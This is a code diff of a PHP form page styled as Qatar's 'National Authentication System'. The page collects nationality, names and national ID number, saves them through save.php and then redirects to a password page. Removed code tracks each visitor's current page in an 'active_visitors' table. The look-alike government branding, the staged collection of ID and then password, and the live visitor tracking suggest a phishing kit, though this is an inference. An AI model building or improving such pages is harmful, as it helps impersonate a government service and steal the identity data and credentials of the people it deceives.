@@ -11,11 +11,6 @@ try {
     $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
     $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
     $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
-    $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
-                               VALUES (:visitor_id, 'صفحة البيانات الشخصية', NOW()) 
-                               ON CONFLICT (visitor_id) 
-                               DO UPDATE SET current_page = 'صفحة البيانات الشخصية', last_seen = NOW()");
-    $stmt_vis->execute([':visitor_id' => $visitor_id]);
 } catch (Exception $e) {}
 ?>
 <!DOCTYPE html>
@@ -23,121 +18,91 @@ try {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام التوثيق الوطني - البيانات الشخصية</title>
+    <title>نظام التوثيق الوطني</title>
     <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
 
     <style>
         :root { --primary-color: #007fb1; --secondary-color: #8a1538; --input-bg: #f2f2f2; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding-top: 80px; display: flex; flex-direction: column; min-height: 100vh; }
-        
-        .header { 
-            position: fixed; top: 0; width: 100%; height: 70px; background-color: #fff; 
-            padding: 0 20px; display: flex; justify-content: space-between; align-items: center; 
-            border-bottom: 1px solid #ddd; z-index: 1000; box-sizing: border-box;
-        }
-        .header-right { display: flex; align-items: center; gap: 15px; }
-        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
-        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); }
-
-        .container { width: 92%; max-width: 500px; margin: 20px auto; padding: 10px; flex: 1; text-align: right; }
-        h2 { font-size: 22px; margin-bottom: 25px; color: #333; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; margin: 0; padding-top: 160px; }
+        .header-wrapper { position: fixed; top: 0; width: 100%; background: #fff; z-index: 1000; border-bottom: 1px solid #ddd; }
+        .top-header { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo-area { display: flex; align-items: center; gap: 15px; }
+        .logo { height: 45px; }
+        .title-text { color: #555; font-size: 16px; font-weight: bold; }
+        .sub-title { font-size: 14px; color: #777; }
+        .menu-icon { font-size: 24px; cursor: pointer; color: #555; }
+        .steps-bar { display: flex; justify-content: space-around; padding: 15px 5px; background: #f9f9f9; border-bottom: 1px solid #eee; }
+        .step { text-align: center; font-size: 12px; color: #555; width: 25%; }
+        .step-num { width: 35px; height: 35px; border-radius: 50%; border: 2px solid var(--primary-color); display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; font-weight: bold; color: var(--primary-color); }
+        .step.active .step-num { background: var(--primary-color); color: #fff; }
+        .container { width: 92%; max-width: 500px; margin: 20px auto; }
         .form-group { margin-bottom: 25px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
-        .required { color: red; }
-        input, select, textarea { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background-color: var(--input-bg) !important; color: #333; font-size: 15px; }
-        ::placeholder { color: #888; font-size: 13px; }
-        textarea { height: 100px; resize: none; }
-        .dob-group { display: flex; gap: 5px; }
-        .gender-group { display: flex; gap: 20px; margin-top: 10px; }
-        .radio-option { display: flex; align-items: center; font-size: 15px; cursor: pointer; }
-        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 20px; }
-        .footer { background-color: #eeeeee; padding: 20px; text-align: center; border-top: 1px solid #cccccc; font-size: 12px; color: #555; }
-        .select2-container--default .select2-selection--single { background-color: var(--input-bg) !important; height: 50px; padding-top: 10px; border: 1px solid #ccc; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
+        input, select, textarea { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; background-color: var(--input-bg); }
+        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="header-right">
-            <div class="menu-icon"><span></span><span></span><span></span></div>
-            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="40">
+    <div class="header-wrapper">
+        <div class="top-header">
+            <div class="logo-area">
+                <div class="menu-icon">≡</div>
+                <div>
+                    <div class="title-text">نظام التوثيق الوطني</div>
+                    <div class="sub-title">National Authentication System</div>
+                </div>
+            </div>
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo">
         </div>
-        <div style="text-align: left; font-size: 14px;"><div style="color: var(--secondary-color); font-weight: bold;">نظام التوثيق الوطني</div></div>
+        
+        <div class="steps-bar">
+            <div class="step"> <div class="step-num">٤</div> انتهاء<br>التسجيل </div>
+            <div class="step"> <div class="step-num">٣</div> كلمة<br>المرور </div>
+            <div class="step active"> <div class="step-num">٢</div> البيانات<br>الشخصية </div>
+            <div class="step"> <div class="step-num">١</div> نوع<br>الحساب </div>
+        </div>
     </div>
 
     <div class="container">
-        <h2>البيانات الشخصية</h2>
         <form id="dataForm" action="save.php" method="POST">
             <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
             
-            <div class="form-group"><label>اختر الجنسية <span class="required">*</span></label>
+            <div class="form-group"><label>اختر الجنسية <span style="color:red">*</span></label>
                 <select id="nationality" name="nationality" class="js-example-basic-single" required>
                     <option value="" disabled selected>اختر الجنسية</option>
-                    <option value="قطر">قطر</option>
-                    <option value="السعودية">السعودية</option>
-                    <option value="الإمارات">الإمارات</option>
-                    <option value="الكويت">الكويت</option>
-                    <option value="البحرين">البحرين</option>
-                    <option value="عمان">عمان</option>
-                    <option value="مصر">مصر</option>
+                    <?php 
+                    $countries = [
+                        "🇶🇦 قطر" => "قطر", "🇸🇦 السعودية" => "السعودية", "🇦🇪 الإمارات" => "الإمارات", "🇰🇼 الكويت" => "الكويت", "🇧🇭 البحرين" => "البحرين", "🇴🇲 عمان" => "عمان", "🇪🇬 مصر" => "مصر", 
+                        "🇯🇴 الأردن" => "الأردن", "🇱🇧 لبنان" => "لبنان", "🇸🇾 سوريا" => "سوريا", "🇮🇶 العراق" => "العراق", "🇵🇸 فلسطين" => "فلسطين", "🇾🇪 اليمن" => "اليمن", "🇱🇾 ليبيا" => "ليبيا", 
+                        "🇹🇳 تونس" => "تونس", "🇩🇿 الجزائر" => "الجزائر", "🇲🇦 المغرب" => "المغرب", "🇸🇩 السودان" => "السودان", "🇲🇷 موريتانيا" => "موريتانيا", "🇸🇴 الصومال" => "الصومال", 
+                        "🇩🇯 جيبوتي" => "جيبوتي", "🇰🇲 جزر القمر" => "جزر القمر", "🇺🇸 الولايات المتحدة" => "الولايات المتحدة", "🇬🇧 المملكة المتحدة" => "المملكة المتحدة", "🇫🇷 فرنسا" => "فرنسا", 
+                        "🇩🇪 ألمانيا" => "ألمانيا", "🇮🇹 إيطاليا" => "إيطاليا", "🇪🇸 إسبانيا" => "إسبانيا", "🇷🇺 روسيا" => "روسيا", "🇨🇳 الصين" => "الصين", "🇯🇵 اليابان" => "اليابان", "🇨🇦 كندا" => "كندا", 
+                        "🇦🇺 أستراليا" => "أستراليا", "🇧🇷 البرازيل" => "البرازيل", "🇮🇳 الهند" => "الهند", "🇵🇰 باكستان" => "باكستان", "🇹🇷 تركيا" => "تركيا", "🇮🇷 إيران" => "إيران", "🇲🇾 ماليزيا" => "ماليزيا",
+                        "🇮🇩 إندونيسيا" => "إندونيسيا", "🇵🇭 الفلبين" => "الفلبين", "🇳🇬 نيجيريا" => "نيجيريا", "🇿🇦 جنوب أفريقيا" => "جنوب أفريقيا", "🇰🇷 كوريا الجنوبية" => "كوريا الجنوبية", "🇹🇭 تايلاند" => "تايلاند"
+                    ];
+                    foreach($countries as $label => $value) {
+                        echo "<option value='$value'>$label</option>";
+                    }
+                    ?>
                 </select>
             </div>
             
-            <div class="form-group"><label>الاسم بالعربي <span class="required">*</span></label><input type="text" name="name_ar" placeholder="الاسم بالعربي" required></div>
-            <div class="form-group"><label>الاسم باللغة الإنجليزية <span class="required">*</span></label><input type="text" name="name_en" placeholder="الاسم باللغة الإنجليزية" required></div>
-            <div class="form-group"><label>رقم الهوية <span class="required">*</span></label><input type="text" name="id_number" placeholder="رقم الهوية" required></div>
-            
-            <div class="form-group"><label>تاريخ الميلاد <span class="required">*</span></label>
-                <div class="dob-group">
-                    <select name="day" required><option value="">يوم</option><?php for($i=1;$i<=31;$i++) echo "<option value='$i'>$i</option>"; ?></select>
-                    <select name="month" required><option value="">شهر</option><?php $m=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر']; foreach($m as $k=>$v) echo "<option value='".($k+1)."'>$v</option>"; ?></select>
-                    <select name="year" required><option value="">سنة</option><?php for($i=2026;$i>=1950;$i--) echo "<option value='$i'>$i</option>"; ?></select>
-                </div>
-            </div>
-
-            <div class="form-group"><label>البريد الإلكتروني <span class="required">*</span></label><input type="email" name="email" placeholder="البريد الإلكتروني" required></div>
-            <div class="form-group"><label>العنوان الحالي <span class="required">*</span></label><textarea name="address" placeholder="العنوان الحالي" required></textarea></div>
-            
-            <div class="form-group"><label>الجنس <span class="required">*</span></label>
-                <div class="gender-group">
-                    <label class="radio-option"><input type="radio" name="gender" value="ذكر" required> ذكر</label>
-                    <label class="radio-option"><input type="radio" name="gender" value="أنثى" required> أنثى</label>
-                </div>
-            </div>
+            <div class="form-group"><label>الاسم بالعربي <span style="color:red">*</span></label><input type="text" name="name_ar" required></div>
+            <div class="form-group"><label>الاسم باللغة الإنجليزية <span style="color:red">*</span></label><input type="text" name="name_en" required></div>
+            <div class="form-group"><label>رقم الهوية <span style="color:red">*</span></label><input type="text" name="id_number" required></div>
             
             <button type="submit" class="btn-submit">استمرار</button>
         </form>
     </div>
 
-    <div class="footer"><p><strong>نظام التوثيق الوطني - دولة قطر</strong></p><p>جميع الحقوق محفوظة © 2026</p></div>
-
     <script>
     $(document).ready(function() {
         $('.js-example-basic-single').select2();
-        
-        // جلب الدول
-        fetch('https://restcountries.com/v3.1/all')
-            .then(response => response.json())
-            .then(data => {
-                const select = $('#nationality');
-                const arabCountries = ['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'];
-                data.sort((a, b) => a.name.common.localeCompare(b.name.common)).forEach(country => {
-                    const name = country.name.common;
-                    if (!arabCountries.includes(name)) {
-                        select.append(`<option value="${name}">${name}</option>`);
-                    }
-                });
-            });
-
-        // التحويل لصفحة الباسورد بعد الإرسال
-        $('#dataForm').on('submit', function(e) {
-            // ملاحظة: بما أن action هو save.php، سيتم الحفظ أولاً
-            // سأقوم بعمل تأخير بسيط لضمان تنفيذ الحفظ ثم الانتقال
-            setTimeout(function() {
-                window.location.href = 'password.php'; 
-            }, 500);
+        $('#dataForm').on('submit', function() {
+            setTimeout(() => { window.location.href = 'password.php'; }, 500);
         });
     });
     </script>
